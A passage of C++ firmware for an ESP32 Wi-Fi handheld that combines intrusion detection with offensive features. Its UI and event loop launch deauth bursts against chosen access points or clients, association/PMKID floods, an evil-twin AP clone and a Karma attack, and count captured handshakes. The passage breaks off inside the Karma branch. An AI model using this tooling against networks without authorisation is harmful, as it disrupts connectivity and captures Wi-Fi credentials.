            lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0x14B8A6), 0);
        } else {
            snprintf(buf, sizeof(buf), "%u AP (Fermo)", (unsigned)aps.size());
            lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0x888888), 0);
        }
        lv_label_set_text(ctx->widsStatsLabel, buf);
    }
}

void createWidsGraphPage(Context* ctx, lv_obj_t* parent) {
    ctx->widsGraphPage = createPage(parent);
    lv_obj_add_flag(ctx->widsGraphPage, LV_OBJ_FLAG_HIDDEN);

    auto* mainRow = lv_obj_create(ctx->widsGraphPage);
    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(mainRow, 0, 0);
    lv_obj_set_style_pad_column(mainRow, 4, 0);
    lv_obj_set_style_border_width(mainRow, 0, 0);
    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);

    auto* leftColumn = lv_obj_create(mainRow);
    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(leftColumn, LV_PCT(100));
    lv_obj_set_flex_grow(leftColumn, 1);
    lv_obj_set_style_pad_all(leftColumn, 0, 0);
    lv_obj_set_style_border_width(leftColumn, 0, 0);
    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);

    auto* chartWrapper = lv_obj_create(leftColumn);
    lv_obj_set_width(chartWrapper, LV_PCT(100));
    lv_obj_set_flex_grow(chartWrapper, 1);
    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
    lv_obj_set_style_border_width(chartWrapper, 0, 0);
    lv_obj_set_style_bg_opa(chartWrapper, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);

    ctx->widsChart = lv_chart_create(chartWrapper);
    lv_obj_set_size(ctx->widsChart, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->widsChart, 0, 0);
    lv_chart_set_type(ctx->widsChart, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(ctx->widsChart, CHART_POINTS);
    lv_chart_set_axis_range(ctx->widsChart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
    lv_chart_set_div_line_count(ctx->widsChart, 3, 0);
    lv_obj_set_style_size(ctx->widsChart, 0, 0, LV_PART_INDICATOR);
    lv_obj_set_style_line_width(ctx->widsChart, 2, LV_PART_ITEMS);
    lv_obj_remove_flag(ctx->widsChart, LV_OBJ_FLAG_SCROLLABLE);
    for (int i = 0; i < MAX_SERIES; i++) {
        ctx->widsSeries[i] = lv_chart_add_series(ctx->widsChart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
        lv_chart_hide_series(ctx->widsChart, ctx->widsSeries[i], true);
    }

    createChannelGrid(chartWrapper);

    ctx->widsActiveChannelIndicator = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->widsActiveChannelIndicator, 14, LV_PCT(100));
    lv_obj_set_style_border_width(ctx->widsActiveChannelIndicator, 1, 0);
    lv_obj_set_style_border_color(ctx->widsActiveChannelIndicator, lv_color_hex(0x14B8A6), 0);
    lv_obj_set_style_radius(ctx->widsActiveChannelIndicator, 3, 0);
    lv_obj_set_style_bg_color(ctx->widsActiveChannelIndicator, lv_color_hex(0x14B8A6), 0);
    lv_obj_set_style_bg_opa(ctx->widsActiveChannelIndicator, LV_OPA_20, 0);
    lv_obj_remove_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_flag(ctx->widsActiveChannelIndicator, LV_OBJ_FLAG_HIDDEN);

    createYAxisLabels(chartWrapper);

    ctx->widsStatsLabel = lv_label_create(chartWrapper);
    lv_obj_set_pos(ctx->widsStatsLabel, 6, 4);
    lv_label_set_text(ctx->widsStatsLabel, "CH 1 | 0 AP | 0 CLI");
    lv_obj_set_style_text_color(ctx->widsStatsLabel, lv_color_hex(0x14B8A6), 0);
    lv_obj_add_flag(ctx->widsStatsLabel, LV_OBJ_FLAG_HIDDEN);

    ctx->widsLabelLayer = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->widsLabelLayer, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->widsLabelLayer, 0, 0);
    lv_obj_set_style_bg_opa(ctx->widsLabelLayer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(ctx->widsLabelLayer, 0, 0);
    lv_obj_remove_flag(ctx->widsLabelLayer, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->widsLabelLayer, LV_OBJ_FLAG_CLICKABLE);

    createAxisLabels(leftColumn);

    constexpr int BTN_W = 40;
    constexpr int BTN_H = 40;
    auto* rightColumn = lv_obj_create(mainRow);
    lv_obj_set_size(rightColumn, BTN_W, LV_PCT(100));
    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(rightColumn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(rightColumn, 0, 0);
    lv_obj_set_style_pad_row(rightColumn, 16, 0);
    lv_obj_set_style_border_width(rightColumn, 0, 0);
    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);

    ctx->widsModeBadges = {};

    // 1. Unified WIDS Defense Start/Stop toggle (Dark Blue Riot Shield)
    ctx->widsStartButton = createImageButton(rightColumn, &wids_shield_icon, onWidsToggleClick, ctx, BTN_W, BTN_H);
    ctx->widsStopButton = nullptr;

    // 2. Dettagli WIDS
    ctx->widsDetailsButton = createIconButton(rightColumn, LV_SYMBOL_LIST, onShowWidsDetail, ctx, BTN_W, BTN_H);

    refreshModeButtons(ctx);
}

void createListPage(Context* ctx, lv_obj_t* parent) {
    ctx->listPage = createPage(parent);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);

    auto* header = lv_obj_create(ctx->listPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    auto* spacer = lv_obj_create(header);
    lv_obj_set_size(spacer, 6, 1);
    lv_obj_set_style_border_width(spacer, 0, 0);
    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
    auto* nameHdr = lv_label_create(header);
    lv_label_set_text(nameHdr, "Rete");
    lv_obj_set_flex_grow(nameHdr, 1);
    addLegendLabel(header, "ch", COL_CH);
    addLegendLabel(header, "d/s", COL_POWER);
    addLegendLabel(header, "sec", COL_SEC);
    addLegendLabel(header, "cli", COL_CLI);

    ctx->list = lv_list_create(ctx->listPage);
    lv_obj_set_width(ctx->list, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->list, 1);
    lv_obj_set_style_pad_all(ctx->list, 0, 0);
    lv_obj_set_style_pad_row(ctx->list, 2, 0);
}

void showPage(Context* ctx, Page page) {
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        ctx->page = page;
        ctx->mutex.unlock();
    }

    if (ctx->moduleHomePage != nullptr) lv_obj_add_flag(ctx->moduleHomePage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
    if (ctx->widsGraphPage != nullptr) lv_obj_add_flag(ctx->widsGraphPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
    if (ctx->widsDetailPage != nullptr) lv_obj_add_flag(ctx->widsDetailPage, LV_OBJ_FLAG_HIDDEN);
    if (ctx->reconPage != nullptr) lv_obj_add_flag(ctx->reconPage, LV_OBJ_FLAG_HIDDEN);

    updateSmartStatusBar(ctx);

    switch (page) {
        case Page::ModuleHome:
            if (ctx->moduleHomePage != nullptr) {
                lv_obj_remove_flag(ctx->moduleHomePage, LV_OBJ_FLAG_HIDDEN);
            }
            if (ctx->moduleTacticalCard != nullptr) {
                lv_group_focus_obj(ctx->moduleTacticalCard);
            }
            updateModuleHomePage(ctx);
            break;
        case Page::Graph:
            lv_obj_remove_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->captureButton != nullptr) {
                lv_group_focus_obj(ctx->captureButton);
            }
            break;
        case Page::WidsGraph:
            if (ctx->widsGraphPage != nullptr) {
                lv_obj_remove_flag(ctx->widsGraphPage, LV_OBJ_FLAG_HIDDEN);
            }
            if (ctx->widsStartButton != nullptr) {
                lv_group_focus_obj(ctx->widsStartButton);
            }
            break;
        case Page::List:
            lv_obj_remove_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
            break;
        case Page::Detail:
            lv_obj_remove_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->detailScroll != nullptr) {
                lv_obj_scroll_to_y(ctx->detailScroll, 0, LV_ANIM_OFF);
                if (ctx->detailClientsButton != nullptr) {
                    lv_group_focus_obj(ctx->detailClientsButton);
                }
            }
            updateDetail(ctx);
            break;
        case Page::Clients:
            lv_obj_remove_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
            for (auto& [k, w] : ctx->clientRows) lv_obj_delete(w);
            ctx->clientRows.clear();
            updateClientsPage(ctx);
            if (ctx->clientsList != nullptr) lv_obj_scroll_to_y(ctx->clientsList, 0, LV_ANIM_OFF);
            break;
        case Page::EvilTwinDetail:
            lv_obj_remove_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
            updateEvilTwinDetailPage(ctx);
            break;
        case Page::WidsDetail:
            if (ctx->widsDetailPage != nullptr) {
                lv_obj_remove_flag(ctx->widsDetailPage, LV_OBJ_FLAG_HIDDEN);
                if (ctx->widsDetailScroll != nullptr) {
                    lv_obj_scroll_to_y(ctx->widsDetailScroll, 0, LV_ANIM_OFF);
                    if (ctx->widsStartButton != nullptr) {
                        lv_group_focus_obj(ctx->widsStartButton);
                    }
                }
            }
            updateWidsDetailPage(ctx);
            break;
        case Page::Recon:
            if (ctx->reconPage != nullptr) {
                lv_obj_remove_flag(ctx->reconPage, LV_OBJ_FLAG_HIDDEN);
                if (ctx->reconList != nullptr) lv_obj_scroll_to_y(ctx->reconList, 0, LV_ANIM_OFF);
                if (ctx->reconToggleButton != nullptr) {
                    lv_group_focus_obj(ctx->reconToggleButton);
                }
            }
            updateReconPage(ctx);
            break;
    }

    lvgl_toolbar_set_back_override(onHardwareBack, ctx);
    updateSmartStatusBar(ctx);
    updateLeds(ctx);
}

void updateViews(Context* ctx) {
    RadioMode mode;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (mode == RadioMode::ActiveScan) {
        auto activeResults = service::wifi::getScanResults();
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            mergeActiveScan(ctx, activeResults);
            ctx->mutex.unlock();
        }
    }

    std::vector<SeenAp> aps;
    std::map<uint64_t, int> clientCounts;
    std::map<uint64_t, uint32_t> dataTotals;
    size_t clientCount = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        aps = sortedByRssi(ctx);
        ctx->visible.clear();
        for (const auto& ap : aps) ctx->visible.push_back(bssidKey(ap.record.bssid));
        uint64_t now = nowMs();
        for (const auto& [clientKey, client] : ctx->clients) {
            if (client.associatedBssid != 0 && now - client.lastSeenMs <= ROW_EXPIRY_MS) {
                clientCounts[client.associatedBssid]++;
                dataTotals[client.associatedBssid] += (client.txCount + client.rxCount);
                clientCount++;
            }
        }
        ctx->mutex.unlock();
    }

    lvgl_lock();
    refreshModeButtons(ctx);

    if (ctx->statsLabel != nullptr) {
        char statsText[80] = "";
        if (!isRadioUsable()) {
            snprintf(statsText, sizeof(statsText), "Wi-Fi in avvio...");
            lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0x888888), 0);
        } else if (ctx->hopActive) {
            WidsAttackType threat = ctx->widsActiveThreat.load();
            uint32_t rate = ctx->widsLastDeauthRate.load();
            if (threat == WidsAttackType::DeauthFlood) {
                snprintf(statsText, sizeof(statsText), "[!] ATTACCO DEAUTH (%u/s)", (unsigned)rate);
                lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0xEF4444), 0);
            } else if (threat == WidsAttackType::RogueApClone) {
                snprintf(statsText, sizeof(statsText), "[!] ATTACCO EVIL TWIN / ROGUE");
                lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0xF97316), 0);
            } else {
                int lock = getCaptureLockChannel();
                int hop = g_hopChannel.load();
                int ch = (lock >= 1 && lock <= 13) ? lock : hop;
                int hs = 0, pmkid = 0;
                if (ctx->mutex.lock(0)) { hs = ctx->handshakesSaved; pmkid = ctx->pmkidSeen; ctx->mutex.unlock(); }
                if (pmkid > 0) {
                    snprintf(statsText, sizeof(statsText), "CH %d | %u AP | %u CLI | HS:%d P:%d",
                        ch, (unsigned)aps.size(), (unsigned)clientCount, hs, pmkid);
                } else if (hs > 0) {
                    snprintf(statsText, sizeof(statsText), "CH %d | %u AP | %u CLI | HS:%d",
                        ch, (unsigned)aps.size(), (unsigned)clientCount, hs);
                } else {
                    snprintf(statsText, sizeof(statsText), "CH %d | %u AP | %u CLI",
                        ch, (unsigned)aps.size(), (unsigned)clientCount);
                }
                lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0xEF4444), 0);
            }
        } else {
            snprintf(statsText, sizeof(statsText), "%u AP (Fermo)", (unsigned)aps.size());
            lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0x888888), 0);
        }
        lv_label_set_text(ctx->statsLabel, statsText);
    }

    Page page;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        page = ctx->page;
        ctx->mutex.unlock();
    } else {
        lvgl_unlock();
        return;
    }

    updateSmartStatusBar(ctx);
    if (page == Page::ModuleHome) updateModuleHomePage(ctx);
    else if (page == Page::Graph) updateGraph(ctx, aps);
    else if (page == Page::WidsGraph) updateWidsGraph(ctx, aps);
    else if (page == Page::List) updateRows(ctx, aps, clientCounts, dataTotals);
    else if (page == Page::Detail) updateDetail(ctx);
    else if (page == Page::Clients) updateClientsPage(ctx);
    else if (page == Page::EvilTwinDetail) updateEvilTwinDetailPage(ctx);
    else if (page == Page::WidsDetail) updateWidsDetailPage(ctx);
    else if (page == Page::Recon) updateReconPage(ctx);
    lvgl_unlock();

    updateLeds(ctx);
}

void onTimer(Context* ctx) {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    RadioMode mode;
    if (ctx->mutex.lock(0)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (state == Off && mode != RadioMode::Stopped) {
        service::wifi::setEnabled(true);
    } else if (mode == RadioMode::ActiveScan && (state == On || state == ConnectionActive) && !service::wifi::isScanning()) {
        service::wifi::scan();
    }

    if (mode == RadioMode::Capture) {
        flushHandshakes(ctx);
        uint32_t deauths = ctx->widsDeauthWindowCount.exchange(0);
        ctx->widsLastDeauthRate.store(deauths);
        if (deauths > ctx->widsPeakDeauthRate.load()) {
            ctx->widsPeakDeauthRate.store(deauths);
        }
        if (deauths >= 3) {
            int ch = ctx->widsLastAttackedChannel;
            if (ch <= 0) ch = getCaptureLockChannel();
            if (ch <= 0) ch = getCurrentRadioChannel();
            triggerWidsAlert(ctx, WidsAttackType::DeauthFlood, "Deauth Flood Burst", ctx->widsLastAttackedBssid, ch, (uint16_t)deauths);
        }
        uint32_t newAps = ctx->widsNewBssidWindowCount.exchange(0);
        if (newAps >= 6) {
            int ch = getCaptureLockChannel();
            if (ch <= 0) ch = getCurrentRadioChannel();
            triggerWidsAlert(ctx, WidsAttackType::BeaconSpam, "Beacon Flood Spam", nullptr, ch, (uint16_t)newAps);
        }
    }

    if (ctx->widsThreatClearTick != 0 && lv_tick_get() > ctx->widsThreatClearTick) {
        ctx->widsActiveThreat.store(WidsAttackType::None);
        ctx->widsThreatClearTick = 0;
        updateLeds(ctx);
    }

    if (window_manager_get_state(ctx->window) == WINDOW_STATE_GRANTED) updateViews(ctx);
}

void stopTimer(Context* ctx) {
    std::unique_ptr<Timer> timer;
    std::unique_ptr<Timer> ledTimer;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        timer = std::move(ctx->timer);
        ledTimer = std::move(ctx->ledTimer);
        ctx->mutex.unlock();
    }
    if (timer) timer->stop();
    if (ledTimer) ledTimer->stop();
}

void onLedTimer(Context* ctx) {
    if (ctx->vuFeeding.load()) {
        int base = ctx->vuLevel.load();

        uint32_t sinceRefresh = (uint32_t)lv_tick_get() - ctx->vuRefreshTick.load();
        float swell = sinceRefresh < 600 ? 0.40f * (1.0f - (float)sinceRefresh / 600.0f) : 0.0f;
        int level = base + (int)(base * swell);
        if (level < 0) level = 0;
        if (level > 255) level = 255;

        service::neopixel::VuLevels levels{};
        levels.left = levels.right = levels.bass = levels.mid = levels.treble = (uint8_t)level;
        service::neopixel::setVuLevels(levels);
    } else {
        updateMultiModeLeds(ctx);
    }
}

void createWidgets(lv_obj_t* parent, void* userData) {
    auto* ctx = static_cast<Context*>(userData);

    lv_obj_set_flex_flow(parent, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(parent, 0, LV_STATE_DEFAULT);
    lv_obj_set_style_pad_all(parent, 0, LV_STATE_DEFAULT);

    ctx->toolbar = nullptr;
    createSmartStatusBar(ctx, parent);

    auto* wrapper = lv_obj_create(parent);
    lv_obj_set_flex_flow(wrapper, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(wrapper, LV_PCT(100));
    lv_obj_set_flex_grow(wrapper, 1);
    lv_obj_set_style_pad_all(wrapper, 0, 0);
    lv_obj_set_style_border_width(wrapper, 0, 0);

    createModuleHomePage(ctx, wrapper);
    createGraphPage(ctx, wrapper);
    createWidsGraphPage(ctx, wrapper);
    createListPage(ctx, wrapper);
    createDetailPage(ctx, wrapper);
    createClientsPage(ctx, wrapper);
    createEvilTwinDetailPage(ctx, wrapper);
    createWidsDetailPage(ctx, wrapper);
    createReconPage(ctx, wrapper);

    showPage(ctx, ctx->page);
}

void destroyWidgets(void* userData) {
    auto* ctx = static_cast<Context*>(userData);
    lvgl_toolbar_set_back_override(nullptr, nullptr);
    ctx->toolbar = nullptr;
    ctx->statusLabel = nullptr;
    ctx->modeBadge = nullptr;
    ctx->modeBadgeLabel = nullptr;
    ctx->statsLabel = nullptr;
    ctx->activeChannelIndicator = nullptr;
    ctx->graphPage = nullptr;
    ctx->chart = nullptr;
    ctx->labelLayer = nullptr;
    for (auto& series : ctx->series) series = nullptr;
    ctx->scanButton = nullptr;
    ctx->captureButton = nullptr;
    ctx->widsButton = nullptr;
    ctx->stopButton = nullptr;
    ctx->listPage = nullptr;
    ctx->list = nullptr;
    ctx->rows.clear();
    ctx->detailPage = nullptr;
    ctx->detailScroll = nullptr;
    ctx->detailClientsButton = nullptr;
    ctx->detailLockButton = nullptr;
    ctx->detailDeauthButton = nullptr;
    ctx->detailPmkidButton = nullptr;
    ctx->detailEvilTwinButton = nullptr;
    ctx->detailEvilTwinDetailsButton = nullptr;
    ctx->detailHsSummary = nullptr;
    ctx->detailSsidLabel = nullptr;
    ctx->detailMacLabel = nullptr;
    ctx->detailSecLabel = nullptr;
    ctx->detailPmfLabel = nullptr;
    ctx->detailChanLabel = nullptr;
    ctx->detailPowerLabel = nullptr;
    ctx->detailPhyLabel = nullptr;
    ctx->detailTimeLabel = nullptr;
    ctx->detailDeauthLabel = nullptr;
    ctx->connectButton = nullptr;
    ctx->clientsPage = nullptr;
    ctx->clientsList = nullptr;
    ctx->clientRows.clear();
    ctx->etDetailPage = nullptr;
    ctx->etStatusLabel = nullptr;
    ctx->etClientsList = nullptr;
    ctx->etLogToggleButton = nullptr;
    ctx->widsDetailPage = nullptr;
    ctx->widsDetailScroll = nullptr;
    ctx->widsThreatLabel = nullptr;
    ctx->widsMetricsLabel = nullptr;
    ctx->widsPcapButton = nullptr;
    ctx->widsChannelModeButton = nullptr;
    ctx->widsFilterSelfButton = nullptr;
    ctx->widsLogList = nullptr;

    ctx->widsGraphPage = nullptr;
    ctx->widsChart = nullptr;
    ctx->widsLabelLayer = nullptr;
    for (auto& series : ctx->widsSeries) series = nullptr;
    ctx->widsActiveChannelIndicator = nullptr;
    ctx->widsModeBadge = nullptr;
    ctx->widsModeBadgeLabel = nullptr;
    ctx->widsStatsLabel = nullptr;
    ctx->widsStartButton = nullptr;
    ctx->widsStopButton = nullptr;
    ctx->widsDetailsButton = nullptr;

    ctx->moduleHomePage = nullptr;
    ctx->moduleTacticalCard = nullptr;
    ctx->moduleSentinelCard = nullptr;
    ctx->moduleReconCard = nullptr;
    ctx->homeTacticalApBadge = nullptr;
    ctx->homeTacticalCliBadge = nullptr;
    ctx->homeTacticalHsBadge = nullptr;
    ctx->homeTacticalPmkBadge = nullptr;
    ctx->homeSentinelBadge = nullptr;
    ctx->homeSentinelSubBadge = nullptr;
    ctx->homeReconBadge = nullptr;
    ctx->homeReconSubBadge = nullptr;
    ctx->smartBar = nullptr;
    ctx->smartBarTitle = nullptr;
    ctx->homeStealthBadge = nullptr;
    ctx->homeStealthCapsule = nullptr;
    ctx->homeTacChip = nullptr;
    ctx->homeSntChip = nullptr;
    ctx->homeRcnChip = nullptr;
    ctx->reconPage = nullptr;
    ctx->reconList = nullptr;
    ctx->reconStatsLabel = nullptr;
    ctx->reconToggleButton = nullptr;
    ctx->reconRows.clear();
    ctx->tacticalModeBadges = {};
    ctx->widsModeBadges = {};
}

int32_t appMain(int /*argc*/, char* /*argv*/[]) {
    uint32_t appInstanceId = app_scheduler_current_app_id();
    Context ctx;
    ctx.appInstanceId = appInstanceId;

    TaskEventGroup event_group {};
    task_event_group_construct(&event_group);

    AppEventSubscription sub {};
    check(app_event_subscribe(&sub, &event_group) == ERROR_NONE);

    ctx.window = window_manager_create_ext(appInstanceId, createWidgets, destroyWidgets, &ctx);

    service::wifi::setScanRecords(MAX_RECORDS);
    service::wifi::setAutoScanPaused(true);
#ifdef ESP_PLATFORM
    wifi_country_t country = {
        .cc = "IT",
        .schan = 1,
        .nchan = 13,
        .max_tx_power = 20,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    esp_wifi_set_country(&country);
    esp_read_mac(ctx.myStaMac, ESP_MAC_WIFI_STA);
    esp_read_mac(ctx.myApMac, ESP_MAC_WIFI_SOFTAP);
    ctx.myMacValid = true;
#endif

    saveLedConfig(&ctx);

    g_active_scanner_ctx = &ctx;
    romhack_keypad_set_media_cb(onMediaKey);

    startCapture(&ctx);
    setCaptureLockChannel(0);

    ctx.timer = std::make_unique<Timer>(Timer::Type::Periodic, REFRESH_MS, [&ctx] {
        onTimer(&ctx);
    });
    ctx.timer->start();

    ctx.ledTimer = std::make_unique<Timer>(Timer::Type::Periodic, 50, [&ctx] {
        onLedTimer(&ctx);
    });
    ctx.ledTimer->start();

    bool shouldClose = false;
    while (!shouldClose) {
        task_event_group_wait_any(&event_group, nullptr, portMAX_DELAY);

        AppEvent event {};
        while (app_event_poll(&sub, &event) == ERROR_NONE) {
            if (event.type == APP_EVENT_CLOSE) {
                shouldClose = true;
                break;
            } else if (event.type == APP_EVENT_RESULT) {
                if (event.result.launch_id == ctx.deauthDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }
                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendDeauthBurstOnChannel(bssid, channel, nullptr);
                        recordLocalAttack(&ctx, WidsAttackType::DeauthFlood, "Deauth Burst (Tactical)", bssid, channel, 6);
                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            ctx.deauthBurstsSent++;
                            ctx.mutex.unlock();
                        }
                    }
                } else if (event.result.launch_id == ctx.clientDeauthDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    uint8_t clientMac[6];
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;

                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto apIt = ctx.seen.find(ctx.selectedKey);
                        auto clientIt = ctx.clients.find(ctx.targetClientKey);
                        if (apIt != ctx.seen.end() && clientIt != ctx.clients.end()) {
                            memcpy(bssid, apIt->second.record.bssid, 6);
                            memcpy(clientMac, clientIt->second.mac, 6);
                            channel = apIt->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }

                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendDeauthBurstOnChannel(bssid, channel, clientMac);
                        recordLocalAttack(&ctx, WidsAttackType::DeauthFlood, "Client Deauth (Tactical)", bssid, channel, 6);
                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            ctx.deauthBurstsSent++;
                            ctx.mutex.unlock();
                        }
                    }
                } else if (event.result.launch_id == ctx.pmkidDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    char ssid[33] = {};
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }
                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendAssociationRequestBurst(bssid, ssid, channel);
                        recordLocalAttack(&ctx, WidsAttackType::DeauthFlood, "Assoc/PMKID Flood (Tactical)", bssid, channel, 6);
                    }
                } else if (event.result.launch_id == ctx.evilTwinDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    char ssid[33] = {};
                    int channel = 0;
                    bool found = false;
                    bool activate = false;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        ctx.evilTwinActive = !ctx.evilTwinActive;
                        activate = ctx.evilTwinActive;
                        ctx.mutex.unlock();
                    }
                    if (found && channel >= 1 && channel <= 13) {
                        if (activate) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                            setCaptureLockChannel(channel);
                            startEvilTwinAp(ssid[0] != '\0' ? ssid : "FreeWifi", channel);
                            sendDeauthBurstOnChannel(bssid, channel, nullptr);
                            recordLocalAttack(&ctx, WidsAttackType::RogueApClone, "Rogue AP Clonato (Tactical)", bssid, channel, 1);
                        } else {
                            stopEvilTwinAp();
                            setCaptureLockChannel(0);
                        }
                    }
                } else if (event.result.launch_id == ctx.reconKarmaDialogId.load() && event.result.result == 0) {
                    std::string targetSsid;
                    uint64_t targetCliKey = 0;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        targetSsid = ctx.reconTargetSsid;
                        targetCliKey = ctx.reconTargetClientKey;
                        ctx.mutex.unlock();
                    }
                    if (!targetSsid.empty()) {
                        int channel = 1;
                        uint8_t targetBssid[6] = {0x02, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E};
                        uint64_t apKey = 0;

                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            // Find if matching AP already seen
                            for (const auto& [k, ap] : ctx.seen) {
                                if (targetSsid == ap.record.ssid && ap.record.channel >= 1 && ap.record.channel <= 13) {
                                    channel = ap.record.channel;
                                    memcpy(targetBssid, ap.record.bssid, 6);
                                    apKey = k;
                                    break;
                                }
                            }
                            if (apKey == 0) {
                                // Create AP entry in seen so Tactical details page can display it
                                if (ctx.myMacValid) {
                                    memcpy(targetBssid, ctx.myApMac, 6);
                                }
                                apKey = bssidKey(targetBssid);
